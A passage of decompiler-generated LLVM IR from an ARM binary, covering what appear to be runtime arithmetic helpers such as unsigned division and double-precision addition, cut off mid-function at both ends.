  %v3_179d8 = icmp eq i32 %v2_179d8, 0
  %v4_179d8 = udiv i32 %v1_17934, 65536
  br i1 %v3_179d8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_179d4
  %v0_179e465 = phi i32 [ %v1_17934, %dec_label_pc_179d4 ], [ %v4_179d8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_179e8 = phi i32 [ %v0_179e465, %.thread16 ], [ %v4_179d8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_179e4 = icmp ugt i32 %v1_179e8, 255
  br i1 %v2_179e4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_179e8 = and i32 %v1_179e8, 128
  %v3_179e8 = icmp eq i32 %v2_179e8, 0
  %v4_179e8 = udiv i32 %v1_179e8, 256
  br i1 %v3_179e8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_179ec = or i32 %storemerge, 8
  store i32 %v2_179ec, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_179f8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_179ec, %bb98 ]
  %v1_179f4 = phi i32 [ %v1_179e8, %bb96 ], [ %v4_179e8, %bb97 ], [ %v4_179e8, %bb98 ]
  %v2_179f0 = icmp ugt i32 %v1_179f4, 15
  br i1 %v2_179f0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_179f4 = and i32 %v1_179f4, 8
  %v3_179f4 = icmp eq i32 %v2_179f4, 0
  %v4_179f4 = udiv i32 %v1_179f4, 16
  br i1 %v3_179f4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_179f8 = add nsw i32 %v1_179f8, 4
  store i32 %v2_179f8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_17a00 = phi i32 [ %v1_179f8, %.thread17 ], [ %v1_179f8, %bb99 ], [ %v2_179f8, %bb100 ]
  %v5_17a04 = phi i32 [ %v1_179f4, %.thread17 ], [ %v4_179f4, %bb99 ], [ %v4_179f4, %bb100 ]
  %v2_179fc = icmp ugt i32 %v5_17a04, 3
  %v7_179fc = icmp eq i32 %v5_17a04, 4
  %v2_17a00 = xor i1 %v7_179fc, true
  %v3_17a00 = and i1 %v2_179fc, %v2_17a00
  br i1 %v3_17a00, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_17a00 = add nsw i32 %v4_17a00, 3
  store i32 %v5_17a00, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_17a04 = phi i32 [ %v4_17a00, %.thread18 ], [ %v5_17a00, %bb101 ]
  %v2_17a04 = xor i1 %v2_179fc, true
  %v3_17a04 = or i1 %v7_179fc, %v2_17a04
  br i1 %v3_17a04, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_17a04 = udiv i32 %v5_17a04, 2
  %v9_17a04 = add i32 %v4_17a04, %v8_17a04
  store i32 %v9_17a04, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_17a08 = phi i32 [ %v4_17a04, %bb102 ], [ %v9_17a04, %bb103 ]
  %v6_17a08 = lshr i32 %v0_17934, %v1_17a08
  store i32 %v6_17a08, i32* %r0.global-to-local, align 4
  ret i32 %v6_17a08

dec_label_pc_17a10:                               ; preds = %entry
  %v0_17a14 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_17a04, { 1, 0 }
  uselistorder i1 %v7_179fc, { 1, 0 }
  uselistorder i32 %v4_179f4, { 1, 0 }
  uselistorder i32 %v1_179f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_179ec, { 1, 0 }
  uselistorder i32 %v4_179e8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_179e8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_179d8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_179b0, { 1, 0 }
  uselistorder i32 %v0_179c0, { 1, 0, 2 }
  uselistorder i32 %v4_179a4, { 1, 0 }
  uselistorder i32 %v1_179ac, { 1, 2, 0 }
  uselistorder i32 %v4_17998, { 1, 0 }
  uselistorder i32 %v1_179a0, { 1, 2, 0 }
  uselistorder i32 %v4_1798c, { 1, 0 }
  uselistorder i32 %v1_17994, { 1, 2, 0 }
  uselistorder i32 %v1_179b8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_17988, { 1, 0 }
  uselistorder i32 %v1_179b4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_17974, { 1, 0 }
  uselistorder i32 %v3_17970, { 1, 0 }
  uselistorder i32 %v1_17970, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_17974, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17960, { 1, 0 }
  uselistorder i32 %v4_1795c, { 2, 1, 0 }
  uselistorder i32 %v1_17960, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_17968.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_17934, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_17934, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_17928, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_179c0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1797c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17968thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_17a28 = udiv i32 %arg1, %arg2
  ret i32 %v2_17a28
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_17a40 = bitcast i64 %tmp to double
  %v9_17a40 = fadd double %v8_17a40, %arg1
  %v10_17a40 = fptrunc double %v9_17a40 to float
  %v11_17a40 = bitcast float %v10_17a40 to i32
  ret i32 %v11_17a40
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_17a44 = load i32, i32* @r0, align 4
  ret i32 %v2_17a44
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17a48 = load i32, i32* @r4, align 4
  store i32 %v3_17a48, i32* %stack_var_-12, align 4
  %v6_17a48 = load i32, i32* @r5, align 4
  %v9_17a48 = load i32, i32* @lr, align 4
  %v0_17a4c = load i32, i32* %r1.global-to-local, align 4
  %v2_17a4c = mul i32 %v0_17a4c, 2
  store i32 %v2_17a4c, i32* %r4.global-to-local, align 4
  %v0_17a50 = load i32, i32* %r3.global-to-local, align 4
  %v2_17a50 = mul i32 %v0_17a50, 2
  store i32 %v2_17a50, i32* %r5.global-to-local, align 4
  %v4_17a54 = icmp eq i32 %v2_17a50, %v2_17a4c
  %v1_17a58 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_17a54, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_17a58 = load i32, i32* %r2.global-to-local, align 4
  %v5_17a58 = icmp eq i32 %v2_17a58, %v1_17a58
  br i1 %v5_17a58, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_17a5c = or i32 %v1_17a58, %v2_17a4c
  %v5_17a5c = icmp eq i32 %v3_17a5c, 0
  br i1 %v5_17a5c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_17a60 = load i32, i32* %r2.global-to-local, align 4
  %v3_17a60 = or i32 %v2_17a60, %v2_17a50
  %v5_17a60 = icmp eq i32 %v3_17a60, 0
  br i1 %v5_17a60, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_17a4c.off = add i32 %v2_17a4c, 4194303
  %tmp = icmp ult i32 %v2_17a4c.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_17a50.off = add i32 %v2_17a50, 4194303
  %tmp17 = icmp ult i32 %v2_17a50.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_17a6c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_17a6c, i32 ptrtoint (i32* @global_var_17ca4.953 to i32))
  %v0_17a70 = load i32, i32* %r4.global-to-local, align 4
  %v3_17a70 = udiv i32 %v0_17a70, 2097152
  store i32 %v3_17a70, i32* %r4.global-to-local, align 4
  %v1_17a74 = load i32, i32* %r5.global-to-local, align 4
  %v4_17a74 = udiv i32 %v1_17a74, 2097152
  %v5_17a74 = sub nsw i32 %v4_17a74, %v3_17a70
  %v5_17a78 = icmp ult i32 %v4_17a74, %v3_17a70
  br i1 %v5_17a78, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_17a78 = sub nsw i32 0, %v5_17a74
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_17a78, %bb13 ], [ %v5_17a74, %.thread3 ]
  %v0_17a9c = phi i32 [ %v7_17a78, %bb13 ], [ %v5_17a74, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_17a7c = icmp ugt i32 %v4_17a74, %v3_17a70
  br i1 %v7_17a7c, label %dec_label_pc_17a80, label %dec_label_pc_17a9c

dec_label_pc_17a80:                               ; preds = %bb14
  %v2_17a80 = add nsw i32 %v0_17a9c, %v3_17a70
  store i32 %v2_17a80, i32* %r4.global-to-local, align 4
  %v0_17a84 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a84 = load i32, i32* %r2.global-to-local, align 4
  %v0_17a88 = load i32, i32* %r1.global-to-local, align 4
  %v1_17a88 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_17a84, i32* %r0.global-to-local, align 4
  store i32 %v1_17a88, i32* %r1.global-to-local, align 4
  store i32 %v0_17a84, i32* %r2.global-to-local, align 4
  store i32 %v0_17a88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a9c

dec_label_pc_17a9c:                               ; preds = %bb14, %dec_label_pc_17a80
  %tmp18 = icmp ugt i32 %v0_17a9c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_17a9c
  %v6_17aa0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_17aa0, i32* %r4.global-to-local, align 4
  store i32 %v6_17a48, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_17a9c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_17a48)
  %v0_17aa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_17aa8 = icmp sgt i32 %v0_17aa8, -1
  %v4_17ab4 = urem i32 %v0_17aa8, 1048576
  %v5_17ab4 = or i32 %v4_17ab4, 1048576
  store i32 %v5_17ab4, i32* %r1.global-to-local, align 4
  br i1 %v3_17aa8, label %dec_label_pc_17ac4, label %dec_label_pc_17abc

dec_label_pc_17abc:                               ; preds = %bb16
  %v0_17abc = load i32, i32* %r0.global-to-local, align 4
  %v1_17abc = sub i32 0, %v0_17abc
  store i32 %v1_17abc, i32* %r0.global-to-local, align 4
  %v2_17abc = icmp eq i32 %v0_17abc, 0
  %v2_17ac0 = icmp eq i1 %v2_17abc, false
  %v5_17ac0 = sext i1 %v2_17ac0 to i32
  %v6_17ac0 = sub nsw i32 %v5_17ac0, %v5_17ab4
  store i32 %v6_17ac0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17ac4

dec_label_pc_17ac4:                               ; preds = %bb16, %dec_label_pc_17abc
  %v0_17ac4 = load i32, i32* %r3.global-to-local, align 4
  %v3_17ac4 = icmp sgt i32 %v0_17ac4, -1
  %v4_17acc = urem i32 %v0_17ac4, 1048576
  %v5_17acc = or i32 %v4_17acc, 1048576
  store i32 %v5_17acc, i32* %r3.global-to-local, align 4
  br i1 %v3_17ac4, label %dec_label_pc_17adc, label %dec_label_pc_17ad4

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17ac4
  %v0_17ad4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ad4 = sub i32 0, %v0_17ad4
  store i32 %v1_17ad4, i32* %r2.global-to-local, align 4
  %v2_17ad4 = icmp eq i32 %v0_17ad4, 0
  %v2_17ad8 = icmp eq i1 %v2_17ad4, false
  %v5_17ad8 = sext i1 %v2_17ad8 to i32
  %v6_17ad8 = sub nsw i32 %v5_17ad8, %v5_17acc
  store i32 %v6_17ad8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17adc

dec_label_pc_17adc:                               ; preds = %dec_label_pc_17ac4, %dec_label_pc_17ad4
  %v0_17adc = load i32, i32* %r4.global-to-local, align 4
  %v1_17adc = load i32, i32* %r5.global-to-local, align 4
  %v4_17adc = icmp eq i32 %v1_17adc, %v0_17adc
  call void @__pseudo_cond_branch(i1 %v4_17adc, i32 ptrtoint (i32* @global_var_17c8c.954 to i32))
  %v1_17ae0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17ae0

; uselistorder directives
  uselistorder i32 %v0_17ac4, { 1, 0 }
  uselistorder i32 %v0_17aa8, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_17a74, { 2, 1, 0 }
  uselistorder i32 %v3_17a70, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17a58, { 1, 0 }
  uselistorder i32 %v2_17a50, { 1, 3, 0, 2 }
  uselistorder i32 %v2_17a4c, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_17adc, { 1, 0 }
  uselistorder label %dec_label_pc_17ac4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_17a9c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17ae4() local_unnamed_addr {
dec_label_pc_17ae4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_17ae4 = load i32, i32* @r4, align 4
  %v1_17ae4 = add i32 %v0_17ae4, -1
  store i32 %v1_17ae4, i32* @r4, align 4
  %v0_17ae8 = load i32, i32* @r5, align 4
  %v1_17ae8 = sub i32 32, %v0_17ae8
  store i32 %v1_17ae8, i32* @lr, align 4
  %v5_17aec = icmp sgt i32 %v0_17ae8, 32
  br i1 %v5_17aec, label %dec_label_pc_17b08, label %dec_label_pc_17af0

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ae4
  %v0_17af0 = load i32, i32* @r2, align 4
  %v6_17af0 = shl i32 %v0_17af0, %v1_17ae8
  store i32 %v6_17af0, i32* %ip.global-to-local, align 4
  %v0_17af4 = load i32, i32* @r0, align 4
  %v3_17af4 = add i32 %v0_17ae8, -1
  %v4_17af4 = shl i32 1, %v3_17af4
  %v7_17af4 = lshr i32 %v0_17af0, %v0_17ae8
  %v8_17af4 = add i32 %v0_17af4, %v7_17af4
  %v9_17af4 = icmp ult i32 %v8_17af4, %v0_17af4
  %v0_17af8 = load i32, i32* @r1, align 4
  %v2_17af8 = zext i1 %v9_17af4 to i32
  %v3_17af8 = add i32 %v2_17af8, %v0_17af8
  %v1_17afc = load i32, i32* @r3, align 4
  %v7_17afc = shl i32 %v1_17afc, %v1_17ae8
  %v8_17afc = add i32 %v7_17afc, %v8_17af4
  store i32 %v8_17afc, i32* %r0.global-to-local, align 4
  %v5_17b00 = and i32 %v1_17afc, %v4_17af4
  %v6_17b00 = icmp ne i32 %v5_17b00, 0
  %v7_17b00 = ashr i32 %v1_17afc, %v0_17ae8
  %v9_17b00 = add i32 %v3_17af8, %v7_17b00
  %v10_17b00 = zext i1 %v6_17b00 to i32
  %v11_17b00 = add i32 %v10_17b00, %v9_17b00
  br label %dec_label_pc_17b24

dec_label_pc_17b08:                               ; preds = %dec_label_pc_17ae4
  %v1_17b08 = add i32 %v0_17ae8, -32
  %v1_17b0c = add i32 %v1_17ae8, 32
  store i32 %v1_17b0c, i32* @lr, align 4
  %v0_17b14 = load i32, i32* @r3, align 4
  %v2_17b14 = add i32 %v1_17ae8, 31
  %v3_17b14 = lshr i32 -2147483648, %v2_17b14
  %v4_17b14 = and i32 %v0_17b14, %v3_17b14
  %v5_17b14 = icmp ne i32 %v4_17b14, 0
  %v6_17b14 = shl i32 %v0_17b14, %v1_17b0c
  %v2_17b18 = or i32 %v6_17b14, 2
  %v2_17b18.v6_17b14 = select i1 %v5_17b14, i32 %v2_17b18, i32 %v6_17b14
  store i32 %v2_17b18.v6_17b14, i32* %ip.global-to-local, align 4
  %v0_17b1c = load i32, i32* @r0, align 4
  %v7_17b1c = ashr i32 %v0_17b14, %v1_17b08
  %v8_17b1c = add i32 %v0_17b1c, %v7_17b1c
  store i32 %v8_17b1c, i32* %r0.global-to-local, align 4
  %v0_17b20 = load i32, i32* @r1, align 4
  %v2_17b20 = and i32 %v0_17b14, 1073741824
  %v3_17b20 = icmp ne i32 %v2_17b20, 0
  %v4_17b20 = ashr i32 %v0_17b14, 31
  %v6_17b20 = add i32 %v0_17b20, %v4_17b20
  %v7_17b20 = zext i1 %v3_17b20 to i32
  %v8_17b20 = add i32 %v6_17b20, %v7_17b20
  br label %dec_label_pc_17b24

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17af0, %dec_label_pc_17b08
  %storemerge = phi i32 [ %v11_17b00, %dec_label_pc_17af0 ], [ %v8_17b20, %dec_label_pc_17b08 ]
  %v0_17b24 = phi i32 [ %v11_17b00, %dec_label_pc_17af0 ], [ %v8_17b20, %dec_label_pc_17b08 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_17b24 = and i32 %v0_17b24, -2147483648
  store i32 %v1_17b24, i32* @r5, align 4
  %v1_17b28 = icmp sgt i32 %v0_17b24, -1
  call void @__pseudo_cond_branch(i1 %v1_17b28, i32 ptrtoint (i32* @global_var_17b38.955 to i32))
  %v0_17b2c = load i32, i32* %ip.global-to-local, align 4
  %v1_17b2c = sub i32 0, %v0_17b2c
  store i32 %v1_17b2c, i32* %ip.global-to-local, align 4
  %v2_17b2c = icmp eq i32 %v0_17b2c, 0
  %v0_17b30 = load i32, i32* %r0.global-to-local, align 4
  %v2_17b30 = icmp eq i1 %v2_17b2c, false
  %v5_17b30 = sext i1 %v2_17b30 to i32
  %v6_17b30 = sub i32 %v5_17b30, %v0_17b30
  store i32 %v6_17b30, i32* %r0.global-to-local, align 4
  %v7_17b30 = zext i1 %v2_17b30 to i32
  %v8_17b30 = icmp ne i32 %v6_17b30, %v7_17b30
  %v9_17b30 = icmp ne i32 %v0_17b30, -1
  %v10_17b30 = or i1 %v9_17b30, %v8_17b30
  %v11_17b30 = icmp ne i32 %v0_17b30, 0
  %v12_17b30 = select i1 %v2_17b30, i1 %v10_17b30, i1 %v11_17b30
  %v0_17b34 = load i32, i32* %r1.global-to-local, align 4
  %v5_17b34 = sext i1 %v12_17b30 to i32
  %v6_17b34 = sub i32 %v5_17b34, %v0_17b34
  store i32 %v6_17b34, i32* @r1, align 4
  ret i32 %v6_17b30

; uselistorder directives
  uselistorder i1 %v2_17b30, { 1, 2, 0 }
  uselistorder i32 %v0_17b30, { 1, 2, 0 }
  uselistorder i32 %v8_17b20, { 1, 0 }
  uselistorder i32 %v0_17b14, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_17b00, { 1, 0 }
  uselistorder i32 %v1_17afc, { 1, 0, 2 }
  uselistorder i32 %v0_17af4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_17b24, { 1, 0 }
}

define i32 @function_17b38(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17b38:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17b38 = load i32, i32* %r1.global-to-local, align 4
  %v3_17b3c = icmp ult i32 %v0_17b38, 1048574
  br i1 %v3_17b3c, label %dec_label_pc_17b80, label %dec_label_pc_17b40

dec_label_pc_17b40:                               ; preds = %dec_label_pc_17b38
  %v3_17b44 = icmp ult i32 %v0_17b38, 2097150
  br i1 %v3_17b44, label %dec_label_pc_17b64, label %dec_label_pc_17b48

dec_label_pc_17b48:                               ; preds = %dec_label_pc_17b40
  %v1_17b48 = urem i32 %v0_17b38, 2
  %v2_17b48 = icmp ne i32 %v1_17b48, 0
  %v3_17b48 = udiv i32 %v0_17b38, 2
  store i32 %v3_17b48, i32* %r1.global-to-local, align 4
  %v0_17b4c = load i32, i32* %r0.global-to-local, align 4
  %v3_17b4c = zext i1 %v2_17b48 to i32
  %v6_17b4c = zext i32 %v0_17b4c to i64
  %v7_17b4c = sub i32 33, %v0_17b4c
  %v8_17b4c = zext i32 %v7_17b4c to i64
  %v9_17b4c = shl i64 %v6_17b4c, %v8_17b4c
  %v10_17b4c = sub i32 32, %v0_17b4c
  %v11_17b4c = shl i32 %v3_17b4c, %v10_17b4c
  %v12_17b4c = zext i32 %v11_17b4c to i64
  %v14_17b4c = or i64 %v12_17b4c, %v9_17b4c
  %v15_17b4c = trunc i64 %v14_17b4c to i32
  %v16_17b4c = add i32 %v0_17b4c, -1
  %v17_17b4c = shl i32 1, %v16_17b4c
  %v18_17b4c = and i32 %v17_17b4c, %v0_17b4c
  %v19_17b4c = icmp ne i32 %v18_17b4c, 0
  store i32 %v15_17b4c, i32* %r0.global-to-local, align 4
  %v0_17b50 = load i32, i32* @ip, align 4
  %v3_17b50 = zext i1 %v19_17b4c to i32
  %v6_17b50 = zext i32 %v0_17b50 to i64
  %v7_17b50 = sub i32 33, %v0_17b50
  %v8_17b50 = zext i32 %v7_17b50 to i64
  %v9_17b50 = shl i64 %v6_17b50, %v8_17b50
  %v10_17b50 = sub i32 32, %v0_17b50
  %v11_17b50 = shl i32 %v3_17b50, %v10_17b50
  %v12_17b50 = zext i32 %v11_17b50 to i64
  %v14_17b50 = or i64 %v12_17b50, %v9_17b50
  %v15_17b50 = trunc i64 %v14_17b50 to i32
  store i32 %v15_17b50, i32* @ip, align 4
  %v0_17b54 = load i32, i32* @r4, align 4
  %v1_17b54 = add i32 %v0_17b54, 1
  store i32 %v1_17b54, i32* @r4, align 4
  %v3_17b58 = mul i32 %v1_17b54, 2097152
  %v2_17b5c = icmp ugt i32 %v3_17b58, -4194305
  call void @__pseudo_cond_branch(i1 %v2_17b5c, i32 ptrtoint (i32* @global_var_17d14.956 to i32))
  br label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b80, %dec_label_pc_17b40, %dec_label_pc_17b48
  %v0_17b64 = load i32, i32* @ip, align 4
  %v2_17b64 = icmp slt i32 %v0_17b64, 0
  %v6_17b64 = icmp eq i32 %v0_17b64, -2147483648
  %v1_17b68 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17b64, label %bb, label %dec_label_pc_17b64._crit_edge

bb:                                               ; preds = %dec_label_pc_17b64
  %v2_17b68 = urem i32 %v1_17b68, 2
  %v3_17b68 = icmp ne i32 %v2_17b68, 0
  br label %dec_label_pc_17b64._crit_edge

dec_label_pc_17b64._crit_edge:                    ; preds = %dec_label_pc_17b64, %bb
  %v1_17b6c = phi i1 [ %v3_17b68, %bb ], [ %v2_17b64, %dec_label_pc_17b64 ]
  %v2_17b6c = zext i1 %v1_17b6c to i32
  %v3_17b6c = add i32 %v2_17b6c, %v1_17b68
  store i32 %v3_17b6c, i32* %r0.global-to-local, align 4
  %v0_17b70 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b70 = load i32, i32* @r4, align 4
  %v2_17b70 = and i32 %v1_17b70, 4096
  %v3_17b70 = icmp ne i32 %v2_17b70, 0
  %v4_17b70 = mul i32 %v1_17b70, 1048576
  %v6_17b70 = add i32 %v4_17b70, %v0_17b70
  %v7_17b70 = zext i1 %v3_17b70 to i32
  %v8_17b70 = add i32 %v7_17b70, %v6_17b70
  %v1_17b74 = load i32, i32* @r5, align 4
  %v2_17b74 = or i32 %v1_17b74, %v8_17b70
  store i32 %v2_17b74, i32* %r1.global-to-local, align 4
  ret i32 %v3_17b6c

dec_label_pc_17b80:                               ; preds = %dec_label_pc_17b38
  %v0_17b80 = load i32, i32* @ip, align 4
  %v1_17b80 = icmp slt i32 %v0_17b80, 0
  %v2_17b80 = mul i32 %v0_17b80, 2
  store i32 %v2_17b80, i32* @ip, align 4
  %v0_17b84 = load i32, i32* %r0.global-to-local, align 4
  %v3_17b84 = mul i32 %v0_17b84, 2
  %v4_17b84 = zext i1 %v1_17b80 to i32
  %v5_17b84 = or i32 %v3_17b84, %v4_17b84
  store i32 %v5_17b84, i32* %r0.global-to-local, align 4
  %v9_17b84 = icmp ule i32 %v5_17b84, %v0_17b84
  %v10_17b84 = icmp ult i32 %v3_17b84, %v0_17b84
  %v11_17b84 = select i1 %v1_17b80, i1 %v9_17b84, i1 %v10_17b84
  %v3_17b88 = mul i32 %v0_17b38, 2
  %v4_17b88 = zext i1 %v11_17b84 to i32
  %v5_17b88 = or i32 %v4_17b88, %v3_17b88
  store i32 %v5_17b88, i32* %r1.global-to-local, align 4
  %v1_17b8c = and i32 %v3_17b88, 1048576
  %v2_17b8c = icmp eq i32 %v1_17b8c, 0
  %v0_17b90 = load i32, i32* @r4, align 4
  %v1_17b90 = add i32 %v0_17b90, -1
  store i32 %v1_17b90, i32* @r4, align 4
  br i1 %v2_17b8c, label %bb7, label %dec_label_pc_17b64

bb7:                                              ; preds = %dec_label_pc_17b80
  ret i32 %v5_17b84

; uselistorder directives
  uselistorder i32 %v0_17b84, { 1, 2, 0 }
  uselistorder i1 %v1_17b80, { 1, 0 }
  uselistorder i32 %v1_17b68, { 1, 0 }
  uselistorder i32 %v0_17b64, { 1, 0 }
  uselistorder i32 %v0_17b50, { 1, 0, 2 }
  uselistorder i32 %v0_17b4c, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 6, 4, 3, 0, 2 }
  uselistorder label %dec_label_pc_17b64._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17b64, { 0, 2, 1 }
}

define i32 @function_17b98() local_unnamed_addr {
dec_label_pc_17b98:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_17b98 = load i32, i32* @r1, align 4
  %v2_17b98 = icmp eq i32 %v0_17b98, 0
  br i1 %v2_17b98, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_17b98
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_17b98
  %v1_17ba410 = load i32, i32* @r0, align 4
  store i32 %v1_17ba410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_17c00 = phi i32 [ %v0_17b98, %bb ], [ %v1_17ba410, %bb38 ]
